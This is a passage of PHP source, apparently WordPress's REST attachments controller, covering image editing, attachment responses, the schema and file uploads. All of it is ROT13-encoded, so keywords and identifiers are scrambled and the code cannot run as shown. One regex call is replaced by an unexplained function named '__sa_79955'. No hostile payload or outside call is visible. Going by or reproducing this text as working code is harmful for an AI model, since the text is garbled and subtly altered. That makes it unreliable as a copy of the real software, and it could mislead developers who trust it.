					vs ( 0 !== $ebgngr ) {
						$erfhyg = $vzntr_rqvgbe->ebgngr( $ebgngr );

						vs ( vf_jc_reebe( $erfhyg ) ) {
							erghea arj JC_Reebe(
								'erfg_vzntr_ebgngvba_snvyrq',
								__( 'Hanoyr gb ebgngr guvf vzntr.' ),
								neenl( 'fgnghf' => 500 )
							);
						}
					}

					oernx;

				pnfr 'pebc':
					$fvmr = $vzntr_rqvgbe->trg_fvmr();

					$pebc_k = (vag) ebhaq( ( $fvmr['jvqgu'] * $netf['yrsg'] ) / 100.0 );
					$pebc_l = (vag) ebhaq( ( $fvmr['urvtug'] * $netf['gbc'] ) / 100.0 );
					$jvqgu  = (vag) ebhaq( ( $fvmr['jvqgu'] * $netf['jvqgu'] ) / 100.0 );
					$urvtug = (vag) ebhaq( ( $fvmr['urvtug'] * $netf['urvtug'] ) / 100.0 );

					vs ( $fvmr['jvqgu'] !== $jvqgu || $fvmr['urvtug'] !== $urvtug ) {
						$erfhyg = $vzntr_rqvgbe->pebc( $pebc_k, $pebc_l, $jvqgu, $urvtug );

						vs ( vf_jc_reebe( $erfhyg ) ) {
							erghea arj JC_Reebe(
								'erfg_vzntr_pebc_snvyrq',
								__( 'Hanoyr gb pebc guvf vzntr.' ),
								neenl( 'fgnghf' => 500 )
							);
						}
					}

					oernx;

			}
		}

		// Pnyphyngr gur svyr anzr.
		$vzntr_rkg  = cnguvasb( $vzntr_svyr, CNGUVASB_RKGRAFVBA );
		$vzntr_anzr = jc_onfranzr( $vzntr_svyr, \".{$vzntr_rkg}\" );

		/*
		 * Qb abg nccraq zhygvcyr `-rqvgrq` gb gur svyr anzr.
		 * Gur hfre znl or rqvgvat n cerivbhfyl rqvgrq vzntr.
		 */
		vs ( cert_zngpu( '/-rqvgrq(-\q+)?$/', $vzntr_anzr ) ) {
			// Erzbir nal `-1`, `-2`, rgp. `jc_havdhr_svyranzr()` jvyy nqq gur cebcre ahzore.
			$vzntr_anzr = __sa_79955( '/-rqvgrq(-\q+)?$/', '-rqvgrq', $vzntr_anzr );
		} ryfr {
			// Nccraq `-rqvgrq` orsber gur rkgrafvba.
			$vzntr_anzr .= '-rqvgrq';
		}

		$svyranzr = \"{$vzntr_anzr}.{$vzntr_rkg}\";

		// Perngr gur hcybnqf fhoqverpgbel vs arrqrq.
		$hcybnqf = jc_hcybnq_qve();

		// Znxr gur svyr anzr havdhr va gur (arj) hcybnq qverpgbel.
		$svyranzr = jc_havdhr_svyranzr( $hcybnqf['cngu'], $svyranzr );

		// Fnir gb qvfx.
		$fnirq = $vzntr_rqvgbe->fnir( $hcybnqf['cngu'] . \"/$svyranzr\" );

		vs ( vf_jc_reebe( $fnirq ) ) {
			erghea $fnirq;
		}

		// Perngr arj nggnpuzrag cbfg.
		$arj_nggnpuzrag_cbfg = neenl(
			'cbfg_zvzr_glcr' => $fnirq['zvzr-glcr'],
			'thvq'           => $hcybnqf['hey'] . \"/$svyranzr\",
			'cbfg_gvgyr'     => $vzntr_anzr,
			'cbfg_pbagrag'   => '',
		);

		// Pbcl cbfg_pbagrag, cbfg_rkprecg, naq cbfg_gvgyr sebz gur rqvgrq vzntr'f nggnpuzrag cbfg.
		$nggnpuzrag_cbfg = trg_cbfg( $nggnpuzrag_vq );

		vs ( $nggnpuzrag_cbfg ) {
			$arj_nggnpuzrag_cbfg['cbfg_pbagrag'] = $nggnpuzrag_cbfg->cbfg_pbagrag;
			$arj_nggnpuzrag_cbfg['cbfg_rkprecg'] = $nggnpuzrag_cbfg->cbfg_rkprecg;
			$arj_nggnpuzrag_cbfg['cbfg_gvgyr']   = $nggnpuzrag_cbfg->cbfg_gvgyr;
		}

		$arj_nggnpuzrag_vq = jc_vafreg_nggnpuzrag( jc_fynfu( $arj_nggnpuzrag_cbfg ), $fnirq['cngu'], 0, gehr );

		vs ( vf_jc_reebe( $arj_nggnpuzrag_vq ) ) {
			vs ( 'qo_hcqngr_reebe' === $arj_nggnpuzrag_vq->trg_reebe_pbqr() ) {
				$arj_nggnpuzrag_vq->nqq_qngn( neenl( 'fgnghf' => 500 ) );
			} ryfr {
				$arj_nggnpuzrag_vq->nqq_qngn( neenl( 'fgnghf' => 400 ) );
			}

			erghea $arj_nggnpuzrag_vq;
		}

		// Pbcl gur vzntr nyg grkg sebz gur rqvgrq vzntr.
		$vzntr_nyg = trg_cbfg_zrgn( $nggnpuzrag_vq, '_jc_nggnpuzrag_vzntr_nyg', gehr );

		vs ( ! rzcgl( $vzntr_nyg ) ) {
			// hcqngr_cbfg_zrgn() rkcrpgf fynfurq.
			hcqngr_cbfg_zrgn( $arj_nggnpuzrag_vq, '_jc_nggnpuzrag_vzntr_nyg', jc_fynfu( $vzntr_nyg ) );
		}

		vs ( jc_vf_freivat_erfg_erdhrfg() ) {
			/*
			 * Frg n phfgbz urnqre jvgu gur nggnpuzrag_vq.
			 * Hfrq ol gur oebjfre/pyvrag gb erfhzr perngvat vzntr fho-fvmrf nsgre n CUC sngny reebe.
			 */
			urnqre( 'K-JC-Hcybnq-Nggnpuzrag-VQ: ' . $arj_nggnpuzrag_vq );
		}

		// Trarengr vzntr fho-fvmrf naq zrgn.
		$arj_vzntr_zrgn = jc_trarengr_nggnpuzrag_zrgnqngn( $arj_nggnpuzrag_vq, $fnirq['cngu'] );

		// Pbcl gur RKVS zrgnqngn sebz gur bevtvany nggnpuzrag vs abg trarengrq sbe gur rqvgrq vzntr.
		vs ( vffrg( $vzntr_zrgn['vzntr_zrgn'] ) && vffrg( $arj_vzntr_zrgn['vzntr_zrgn'] ) && vf_neenl( $arj_vzntr_zrgn['vzntr_zrgn'] ) ) {
			// Zretr ohg fxvc rzcgl inyhrf.
			sbernpu ( (neenl) $vzntr_zrgn['vzntr_zrgn'] nf $xrl => $inyhr ) {
				vs ( rzcgl( $arj_vzntr_zrgn['vzntr_zrgn'][ $xrl ] ) && ! rzcgl( $inyhr ) ) {
					$arj_vzntr_zrgn['vzntr_zrgn'][ $xrl ] = $inyhr;
				}
			}
		}

		// Erfrg bevragngvba. Ng guvf cbvag gur vzntr vf rqvgrq naq bevragngvba vf pbeerpg.
		vs ( ! rzcgl( $arj_vzntr_zrgn['vzntr_zrgn']['bevragngvba'] ) ) {
			$arj_vzntr_zrgn['vzntr_zrgn']['bevragngvba'] = 1;
		}

		// Gur nggnpuzrag_vq znl punatr vs gur fvgr vf rkcbegrq naq vzcbegrq.
		$arj_vzntr_zrgn['cnerag_vzntr'] = neenl(
			'nggnpuzrag_vq' => $nggnpuzrag_vq,
			// Cngu gb gur bevtvanyyl hcybnqrq vzntr svyr eryngvir gb gur hcybnqf qverpgbel.
			'svyr'          => _jc_eryngvir_hcybnq_cngu( $vzntr_svyr ),
		);

		/**
		 * Svygref gur zrgn qngn sbe gur arj vzntr perngrq ol rqvgvat na rkvfgvat vzntr.
		 *
		 * @fvapr 5.5.0
		 *
		 * @cnenz neenl $arj_vzntr_zrgn    Zrgn qngn sbe gur arj vzntr.
		 * @cnenz vag   $arj_nggnpuzrag_vq Nggnpuzrag cbfg VQ sbe gur arj vzntr.
		 * @cnenz vag   $nggnpuzrag_vq     Nggnpuzrag cbfg VQ sbe gur rqvgrq (cnerag) vzntr.
		 */
		$arj_vzntr_zrgn = nccyl_svygref( 'jc_rqvgrq_vzntr_zrgnqngn', $arj_vzntr_zrgn, $arj_nggnpuzrag_vq, $nggnpuzrag_vq );

		jc_hcqngr_nggnpuzrag_zrgnqngn( $arj_nggnpuzrag_vq, $arj_vzntr_zrgn );

		$erfcbafr = $guvf->cercner_vgrz_sbe_erfcbafr( trg_cbfg( $arj_nggnpuzrag_vq ), $erdhrfg );
		$erfcbafr->frg_fgnghf( 201 );
		$erfcbafr->urnqre( 'Ybpngvba', erfg_hey( fcevags( '%f/%f/%f', $guvf->anzrfcnpr, $guvf->erfg_onfr, $arj_nggnpuzrag_vq ) ) );

		erghea $erfcbafr;
	}

	/**
	 * Cercnerf n fvatyr nggnpuzrag sbe perngr be hcqngr.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg bowrpg.
	 * @erghea fgqPynff|JC_Reebe Cbfg bowrpg.
	 */
	cebgrpgrq shapgvba cercner_vgrz_sbe_qngnonfr( $erdhrfg ) {
		$cercnerq_nggnpuzrag = cnerag::cercner_vgrz_sbe_qngnonfr( $erdhrfg );

		// Nggnpuzrag pncgvba (cbfg_rkprecg vagreanyyl).
		vs ( vffrg( $erdhrfg['pncgvba'] ) ) {
			vs ( vf_fgevat( $erdhrfg['pncgvba'] ) ) {
				$cercnerq_nggnpuzrag->cbfg_rkprecg = $erdhrfg['pncgvba'];
			} ryfrvs ( vffrg( $erdhrfg['pncgvba']['enj'] ) ) {
				$cercnerq_nggnpuzrag->cbfg_rkprecg = $erdhrfg['pncgvba']['enj'];
			}
		}

		// Nggnpuzrag qrfpevcgvba (cbfg_pbagrag vagreanyyl).
		vs ( vffrg( $erdhrfg['qrfpevcgvba'] ) ) {
			vs ( vf_fgevat( $erdhrfg['qrfpevcgvba'] ) ) {
				$cercnerq_nggnpuzrag->cbfg_pbagrag = $erdhrfg['qrfpevcgvba'];
			} ryfrvs ( vffrg( $erdhrfg['qrfpevcgvba']['enj'] ) ) {
				$cercnerq_nggnpuzrag->cbfg_pbagrag = $erdhrfg['qrfpevcgvba']['enj'];
			}
		}

		vs ( vffrg( $erdhrfg['cbfg'] ) ) {
			$cercnerq_nggnpuzrag->cbfg_cnerag = (vag) $erdhrfg['cbfg'];
		}

		erghea $cercnerq_nggnpuzrag;
	}

	/**
	 * Cercnerf n fvatyr nggnpuzrag bhgchg sbe erfcbafr.
	 *
	 * @fvapr 4.7.0
	 * @fvapr 5.9.0 Eranzrq `$cbfg` gb `$vgrz` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz JC_Cbfg         $vgrz    Nggnpuzrag bowrpg.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg bowrpg.
	 * @erghea JC_ERFG_Erfcbafr Erfcbafr bowrpg.
	 */
	choyvp shapgvba cercner_vgrz_sbe_erfcbafr( $vgrz, $erdhrfg ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$cbfg = $vgrz;

		$erfcbafr = cnerag::cercner_vgrz_sbe_erfcbafr( $cbfg, $erdhrfg );
		$svryqf   = $guvf->trg_svryqf_sbe_erfcbafr( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		vs ( va_neenl( 'qrfpevcgvba', $svryqf, gehr ) ) {
			$qngn['qrfpevcgvba'] = neenl(
				'enj'      => $cbfg->cbfg_pbagrag,
				/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cbfg-grzcyngr.cuc */
				'eraqrerq' => nccyl_svygref( 'gur_pbagrag', $cbfg->cbfg_pbagrag ),
			);
		}

		vs ( va_neenl( 'pncgvba', $svryqf, gehr ) ) {
			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cbfg-grzcyngr.cuc */
			$pncgvba = nccyl_svygref( 'trg_gur_rkprecg', $cbfg->cbfg_rkprecg, $cbfg );

			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cbfg-grzcyngr.cuc */
			$pncgvba = nccyl_svygref( 'gur_rkprecg', $pncgvba );

			$qngn['pncgvba'] = neenl(
				'enj'      => $cbfg->cbfg_rkprecg,
				'eraqrerq' => $pncgvba,
			);
		}

		vs ( va_neenl( 'nyg_grkg', $svryqf, gehr ) ) {
			$qngn['nyg_grkg'] = trg_cbfg_zrgn( $cbfg->VQ, '_jc_nggnpuzrag_vzntr_nyg', gehr );
		}

		vs ( va_neenl( 'zrqvn_glcr', $svryqf, gehr ) ) {
			$qngn['zrqvn_glcr'] = jc_nggnpuzrag_vf_vzntr( $cbfg->VQ ) ? 'vzntr' : 'svyr';
		}

		vs ( va_neenl( 'zvzr_glcr', $svryqf, gehr ) ) {
			$qngn['zvzr_glcr'] = $cbfg->cbfg_zvzr_glcr;
		}

		vs ( va_neenl( 'zrqvn_qrgnvyf', $svryqf, gehr ) ) {
			$qngn['zrqvn_qrgnvyf'] = jc_trg_nggnpuzrag_zrgnqngn( $cbfg->VQ );

			// Rafher rzcgl qrgnvyf vf na rzcgl bowrpg.
			vs ( rzcgl( $qngn['zrqvn_qrgnvyf'] ) ) {
				$qngn['zrqvn_qrgnvyf'] = arj fgqPynff();
			} ryfrvs ( ! rzcgl( $qngn['zrqvn_qrgnvyf']['fvmrf'] ) ) {

				sbernpu ( $qngn['zrqvn_qrgnvyf']['fvmrf'] nf $fvmr => &$fvmr_qngn ) {

					vs ( vffrg( $fvmr_qngn['zvzr-glcr'] ) ) {
						$fvmr_qngn['zvzr_glcr'] = $fvmr_qngn['zvzr-glcr'];
						hafrg( $fvmr_qngn['zvzr-glcr'] );
					}

					// Hfr gur fnzr zrgubq vzntr_qbjafvmr() qbrf.
					$vzntr_fep = jc_trg_nggnpuzrag_vzntr_fep( $cbfg->VQ, $fvmr );
					vs ( ! $vzntr_fep ) {
						pbagvahr;
					}

					$fvmr_qngn['fbhepr_hey'] = $vzntr_fep[0];
				}

				$shyy_fep = jc_trg_nggnpuzrag_vzntr_fep( $cbfg->VQ, 'shyy' );

				vs ( ! rzcgl( $shyy_fep ) ) {
					$qngn['zrqvn_qrgnvyf']['fvmrf']['shyy'] = neenl(
						'svyr'       => jc_onfranzr( $shyy_fep[0] ),
						'jvqgu'      => $shyy_fep[1],
						'urvtug'     => $shyy_fep[2],
						'zvzr_glcr'  => $cbfg->cbfg_zvzr_glcr,
						'fbhepr_hey' => $shyy_fep[0],
					);
				}
			} ryfr {
				$qngn['zrqvn_qrgnvyf']['fvmrf'] = arj fgqPynff();
			}
		}

		vs ( va_neenl( 'cbfg', $svryqf, gehr ) ) {
			$qngn['cbfg'] = ! rzcgl( $cbfg->cbfg_cnerag ) ? (vag) $cbfg->cbfg_cnerag : ahyy;
		}

		vs ( va_neenl( 'fbhepr_hey', $svryqf, gehr ) ) {
			$qngn['fbhepr_hey'] = jc_trg_nggnpuzrag_hey( $cbfg->VQ );
		}

		vs ( va_neenl( 'zvffvat_vzntr_fvmrf', $svryqf, gehr ) ) {
			erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/vzntr.cuc';
			$qngn['zvffvat_vzntr_fvmrf'] = neenl_xrlf( jc_trg_zvffvat_vzntr_fhofvmrf( $cbfg->VQ ) );
		}

		$pbagrkg = ! rzcgl( $erdhrfg['pbagrkg'] ) ? $erdhrfg['pbagrkg'] : 'ivrj';

		$qngn = $guvf->svygre_erfcbafr_ol_pbagrkg( $qngn, $pbagrkg );

		$yvaxf = $erfcbafr->trg_yvaxf();

		// Jenc gur qngn va n erfcbafr bowrpg.
		$erfcbafr = erfg_rafher_erfcbafr( $qngn );

		sbernpu ( $yvaxf nf $ery => $ery_yvaxf ) {
			sbernpu ( $ery_yvaxf nf $yvax ) {
				$erfcbafr->nqq_yvax( $ery, $yvax['uers'], $yvax['nggevohgrf'] );
			}
		}

		/**
		 * Svygref na nggnpuzrag erghearq sebz gur ERFG NCV.
		 *
		 * Nyybjf zbqvsvpngvba bs gur nggnpuzrag evtug orsber vg vf erghearq.
		 *
		 * @fvapr 4.7.0
		 *
		 * @cnenz JC_ERFG_Erfcbafr $erfcbafr Gur erfcbafr bowrpg.
		 * @cnenz JC_Cbfg          $cbfg     Gur bevtvany nggnpuzrag cbfg.
		 * @cnenz JC_ERFG_Erdhrfg  $erdhrfg  Erdhrfg hfrq gb trarengr gur erfcbafr.
		 */
		erghea nccyl_svygref( 'erfg_cercner_nggnpuzrag', $erfcbafr, $cbfg, $erdhrfg );
	}

	/**
	 * Ergevrirf gur nggnpuzrag'f fpurzn, pbasbezvat gb WFBA Fpurzn.
	 *
	 * @fvapr 4.7.0
	 *
	 * @erghea neenl Vgrz fpurzn nf na neenl.
	 */
	choyvp shapgvba trg_vgrz_fpurzn() {
		vs ( $guvf->fpurzn ) {
			erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
		}

		$fpurzn = cnerag::trg_vgrz_fpurzn();

		$fpurzn['cebcregvrf']['nyg_grkg'] = neenl(
			'qrfpevcgvba' => __( 'Nygreangvir grkg gb qvfcynl jura nggnpuzrag vf abg qvfcynlrq.' ),
			'glcr'        => 'fgevat',
			'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
			'net_bcgvbaf' => neenl(
				'fnavgvmr_pnyyonpx' => 'fnavgvmr_grkg_svryq',
			),
		);

		$fpurzn['cebcregvrf']['pncgvba'] = neenl(
			'qrfpevcgvba' => __( 'Gur nggnpuzrag pncgvba.' ),
			'glcr'        => 'bowrpg',
			'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
			'net_bcgvbaf' => neenl(
				'fnavgvmr_pnyyonpx' => ahyy, // Abgr: fnavgvmngvba vzcyrzragrq va frys::cercner_vgrz_sbe_qngnonfr().
				'inyvqngr_pnyyonpx' => ahyy, // Abgr: inyvqngvba vzcyrzragrq va frys::cercner_vgrz_sbe_qngnonfr().
			),
			'cebcregvrf'  => neenl(
				'enj'      => neenl(
					'qrfpevcgvba' => __( 'Pncgvba sbe gur nggnpuzrag, nf vg rkvfgf va gur qngnonfr.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'rqvg' ),
				),
				'eraqrerq' => neenl(
					'qrfpevcgvba' => __( 'UGZY pncgvba sbe gur nggnpuzrag, genafsbezrq sbe qvfcynl.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
					'ernqbayl'    => gehr,
				),
			),
		);

		$fpurzn['cebcregvrf']['qrfpevcgvba'] = neenl(
			'qrfpevcgvba' => __( 'Gur nggnpuzrag qrfpevcgvba.' ),
			'glcr'        => 'bowrpg',
			'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
			'net_bcgvbaf' => neenl(
				'fnavgvmr_pnyyonpx' => ahyy, // Abgr: fnavgvmngvba vzcyrzragrq va frys::cercner_vgrz_sbe_qngnonfr().
				'inyvqngr_pnyyonpx' => ahyy, // Abgr: inyvqngvba vzcyrzragrq va frys::cercner_vgrz_sbe_qngnonfr().
			),
			'cebcregvrf'  => neenl(
				'enj'      => neenl(
					'qrfpevcgvba' => __( 'Qrfpevcgvba sbe gur nggnpuzrag, nf vg rkvfgf va gur qngnonfr.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'rqvg' ),
				),
				'eraqrerq' => neenl(
					'qrfpevcgvba' => __( 'UGZY qrfpevcgvba sbe gur nggnpuzrag, genafsbezrq sbe qvfcynl.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
			),
		);

		$fpurzn['cebcregvrf']['zrqvn_glcr'] = neenl(
			'qrfpevcgvba' => __( 'Nggnpuzrag glcr.' ),
			'glcr'        => 'fgevat',
			'rahz'        => neenl( 'vzntr', 'svyr' ),
			'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
			'ernqbayl'    => gehr,
		);

		$fpurzn['cebcregvrf']['zvzr_glcr'] = neenl(
			'qrfpevcgvba' => __( 'Gur nggnpuzrag ZVZR glcr.' ),
			'glcr'        => 'fgevat',
			'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
			'ernqbayl'    => gehr,
		);

		$fpurzn['cebcregvrf']['zrqvn_qrgnvyf'] = neenl(
			'qrfpevcgvba' => __( 'Qrgnvyf nobhg gur zrqvn svyr, fcrpvsvp gb vgf glcr.' ),
			'glcr'        => 'bowrpg',
			'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
			'ernqbayl'    => gehr,
		);

		$fpurzn['cebcregvrf']['cbfg'] = neenl(
			'qrfpevcgvba' => __( 'Gur VQ sbe gur nffbpvngrq cbfg bs gur nggnpuzrag.' ),
			'glcr'        => 'vagrtre',
			'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
		);

		$fpurzn['cebcregvrf']['fbhepr_hey'] = neenl(
			'qrfpevcgvba' => __( 'HEY gb gur bevtvany nggnpuzrag svyr.' ),
			'glcr'        => 'fgevat',
			'sbezng'      => 'hev',
			'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
			'ernqbayl'    => gehr,
		);

		$fpurzn['cebcregvrf']['zvffvat_vzntr_fvmrf'] = neenl(
			'qrfpevcgvba' => __( 'Yvfg bs gur zvffvat vzntr fvmrf bs gur nggnpuzrag.' ),
			'glcr'        => 'neenl',
			'vgrzf'       => neenl( 'glcr' => 'fgevat' ),
			'pbagrkg'     => neenl( 'rqvg' ),
			'ernqbayl'    => gehr,
		);

		hafrg( $fpurzn['cebcregvrf']['cnffjbeq'] );

		$guvf->fpurzn = $fpurzn;

		erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
	}

	/**
	 * Unaqyrf na hcybnq ivn enj CBFG qngn.
	 *
	 * @fvapr 4.7.0
	 * @fvapr 6.6.0 Nqqrq gur `$gvzr` cnenzrgre.
	 *
	 * @cnenz fgevat      $qngn    Fhccyvrq svyr qngn.
	 * @cnenz neenl       $urnqref UGGC urnqref sebz gur erdhrfg.
	 * @cnenz fgevat|ahyy $gvzr    Bcgvbany. Gvzr sbeznggrq va 'llll/zz'. Qrsnhyg ahyy.
	 * @erghea neenl|JC_Reebe Qngn sebz jc_unaqyr_fvqrybnq().
	 */
	cebgrpgrq shapgvba hcybnq_sebz_qngn( $qngn, $urnqref, $gvzr = ahyy ) {
		vs ( rzcgl( $qngn ) ) {
			erghea arj JC_Reebe(
				'erfg_hcybnq_ab_qngn',
				__( 'Ab qngn fhccyvrq.' ),
				neenl( 'fgnghf' => 400 )
			);
		}

		vs ( rzcgl( $urnqref['pbagrag_glcr'] ) ) {
			erghea arj JC_Reebe(
				'erfg_hcybnq_ab_pbagrag_glcr',
				__( 'Ab Pbagrag-Glcr fhccyvrq.' ),
				neenl( 'fgnghf' => 400 )
			);
		}

		vs ( rzcgl( $urnqref['pbagrag_qvfcbfvgvba'] ) ) {
			erghea arj JC_Reebe(
				'erfg_hcybnq_ab_pbagrag_qvfcbfvgvba',
				__( 'Ab Pbagrag-Qvfcbfvgvba fhccyvrq.' ),
				neenl( 'fgnghf' => 400 )
			);
		}

		$svyranzr = frys::trg_svyranzr_sebz_qvfcbfvgvba( $urnqref['pbagrag_qvfcbfvgvba'] );

		vs ( rzcgl( $svyranzr ) ) {
			erghea arj JC_Reebe(
				'erfg_hcybnq_vainyvq_qvfcbfvgvba',
				__( 'Vainyvq Pbagrag-Qvfcbfvgvba fhccyvrq. Pbagrag-Qvfcbfvgvba arrqf gb or sbeznggrq nf `nggnpuzrag; svyranzr=\"vzntr.cat\"` be fvzvyne.' ),
				neenl( 'fgnghf' => 400 )
			);
		}

		vs ( ! rzcgl( $urnqref['pbagrag_zq5'] ) ) {
			$pbagrag_zq5 = neenl_fuvsg( $urnqref['pbagrag_zq5'] );
			$rkcrpgrq    = gevz( $pbagrag_zq5 );
			$npghny      = zq5( $qngn );

			vs ( $rkcrpgrq !== $npghny ) {
				erghea arj JC_Reebe(
					'erfg_hcybnq_unfu_zvfzngpu',
					__( 'Pbagrag unfu qvq abg zngpu rkcrpgrq.' ),
					neenl( 'fgnghf' => 412 )
				);
			}
		}

		// Trg gur pbagrag-glcr.
		$glcr = neenl_fuvsg( $urnqref['pbagrag_glcr'] );

		// Vapyhqr svyrflfgrz shapgvbaf gb trg npprff gb jc_grzcanz() naq jc_unaqyr_fvqrybnq().
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/svyr.cuc';

		// Fnir gur svyr.
		$gzcsanzr = jc_grzcanz( $svyranzr );

		$sc = sbcra( $gzcsanzr, 'j+' );

		vs ( ! $sc ) {
			erghea arj JC_Reebe(
				'erfg_hcybnq_svyr_reebe',
				__( 'Pbhyq abg bcra svyr unaqyr.' ),
				neenl( 'fgnghf' => 500 )
			);
		}

		sjevgr( $sc, $qngn );
		spybfr( $sc );

		// Abj, fvqrybnq vg va.
		$svyr_qngn = neenl(
			'reebe'    => ahyy,
			'gzc_anzr' => $gzcsanzr,
			'anzr'     => $svyranzr,
			'glcr'     => $glcr,
		);

		$fvmr_purpx = frys::purpx_hcybnq_fvmr( $svyr_qngn );
		vs ( vf_jc_reebe( $fvmr_purpx ) ) {
			erghea $fvmr_purpx;
		}

		$bireevqrf = neenl(
			'grfg_sbez' => snyfr,
		);

		$fvqrybnqrq = jc_unaqyr_fvqrybnq( $svyr_qngn, $bireevqrf, $gvzr );

		vs ( vffrg( $fvqrybnqrq['reebe'] ) ) {
			@hayvax( $gzcsanzr );

			erghea arj JC_Reebe(
				'erfg_hcybnq_fvqrybnq_reebe',
				$fvqrybnqrq['reebe'],
				neenl( 'fgnghf' => 500 )
			);
		}

		erghea $fvqrybnqrq;
	}

	/**
	 * Cnefrf svyranzr sebz n Pbagrag-Qvfcbfvgvba urnqre inyhr.
	 *
	 * Nf cre ESP6266:
	 *
	 *     pbagrag-qvfcbfvgvba = \"Pbagrag-Qvfcbfvgvba\" \":\"
	 *                            qvfcbfvgvba-glcr *( \";\" qvfcbfvgvba-cnez )
	 *
	 *     qvfcbfvgvba-glcr    = \"vayvar\" | \"nggnpuzrag\" | qvfc-rkg-glcr
	 *                         ; pnfr-vafrafvgvir
	 *     qvfc-rkg-glcr       = gbxra
	 *
	 *     qvfcbfvgvba-cnez    = svyranzr-cnez | qvfc-rkg-cnez
	 *
	 *     svyranzr-cnez       = \"svyranzr\" \"=\" inyhr
	 *                         | \"svyranzr*\" \"=\" rkg-inyhr
	 *
	 *     qvfc-rkg-cnez       = gbxra \"=\" inyhr
	 *                         | rkg-gbxra \"=\" rkg-inyhr
	 *     rkg-gbxra           = <gur punenpgref va gbxra, sbyybjrq ol \"*\">
	 *
	 * @fvapr 4.7.0
	 *
	 * @yvax uggcf://gbbyf.vrgs.bet/ugzy/esp2388
	 * @yvax uggcf://gbbyf.vrgs.bet/ugzy/esp6266
	 *
	 * @cnenz fgevat[] $qvfcbfvgvba_urnqre Yvfg bs Pbagrag-Qvfcbfvgvba urnqre inyhrf.
	 * @erghea fgevat|ahyy Svyranzr vs ninvynoyr, be ahyy vs abg sbhaq.
	 */
	choyvp fgngvp shapgvba trg_svyranzr_sebz_qvfcbfvgvba( $qvfcbfvgvba_urnqre ) {
		// Trg gur svyranzr.
		$svyranzr = ahyy;

		sbernpu ( $qvfcbfvgvba_urnqre nf $inyhr ) {
			$inyhr = gevz( $inyhr );

			vs ( ! fge_pbagnvaf( $inyhr, ';' ) ) {
				pbagvahr;
			}

			yvfg( , $ngge_cnegf ) = rkcybqr( ';', $inyhr, 2 );

			$ngge_cnegf = rkcybqr( ';', $ngge_cnegf );
			$nggevohgrf = neenl();

			sbernpu ( $ngge_cnegf nf $cneg ) {
				vs ( ! fge_pbagnvaf( $cneg, '=' ) ) {
					pbagvahr;
				}

				yvfg( $xrl, $inyhr ) = rkcybqr( '=', $cneg, 2 );

				$nggevohgrf[ gevz( $xrl ) ] = gevz( $inyhr );
			}

			vs ( rzcgl( $nggevohgrf['svyranzr'] ) ) {
				pbagvahr;
			}

			$svyranzr = gevz( $nggevohgrf['svyranzr'] );

			// Hadhbgr dhbgrq svyranzr, ohg nsgre gevzzvat.
			vs ( fge_fgnegf_jvgu( $svyranzr, '\"' ) && fge_raqf_jvgu( $svyranzr, '\"' ) ) {
				$svyranzr = fhofge( $svyranzr, 1, -1 );
			}
		}

		erghea $svyranzr;
	}

	/**
	 * Ergevrirf gur dhrel cnenzf sbe pbyyrpgvbaf bs nggnpuzragf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @erghea neenl Dhrel cnenzrgref sbe gur nggnpuzrag pbyyrpgvba nf na neenl.
	 */
	choyvp shapgvba trg_pbyyrpgvba_cnenzf() {
		$cnenzf                            = cnerag::trg_pbyyrpgvba_cnenzf();
		$cnenzf['fgnghf']['qrsnhyg']       = 'vaurevg';
		$cnenzf['fgnghf']['vgrzf']['rahz'] = neenl( 'vaurevg', 'cevingr', 'genfu' );
		$zrqvn_glcrf                       = $guvf->trg_zrqvn_glcrf();

		$cnenzf['zrqvn_glcr'] = neenl(
			'qrsnhyg'     => ahyy,
			'qrfpevcgvba' => __( 'Yvzvg erfhyg frg gb nggnpuzragf bs n cnegvphyne zrqvn glcr.' ),
			'glcr'        => 'fgevat',
			'rahz'        => neenl_xrlf( $zrqvn_glcrf ),
		);

		$cnenzf['zvzr_glcr'] = neenl(
			'qrsnhyg'     => ahyy,
			'qrfpevcgvba' => __( 'Yvzvg erfhyg frg gb nggnpuzragf bs n cnegvphyne ZVZR glcr.' ),
			'glcr'        => 'fgevat',
		);

		erghea $cnenzf;
	}

	/**
	 * Unaqyrf na hcybnq ivn zhygvcneg/sbez-qngn ($_SVYRF).
	 *
	 * @fvapr 4.7.0
	 * @fvapr 6.6.0 Nqqrq gur `$gvzr` cnenzrgre.
	 *
	 * @cnenz neenl       $svyrf   Qngn sebz gur `$_SVYRF` fhcretybony.
	 * @cnenz neenl       $urnqref UGGC urnqref sebz gur erdhrfg.
	 * @cnenz fgevat|ahyy $gvzr    Bcgvbany. Gvzr sbeznggrq va 'llll/zz'. Qrsnhyg ahyy.
	 * @erghea neenl|JC_Reebe Qngn sebz jc_unaqyr_hcybnq().
	 */
	cebgrpgrq shapgvba hcybnq_sebz_svyr( $svyrf, $urnqref, $gvzr = ahyy ) {
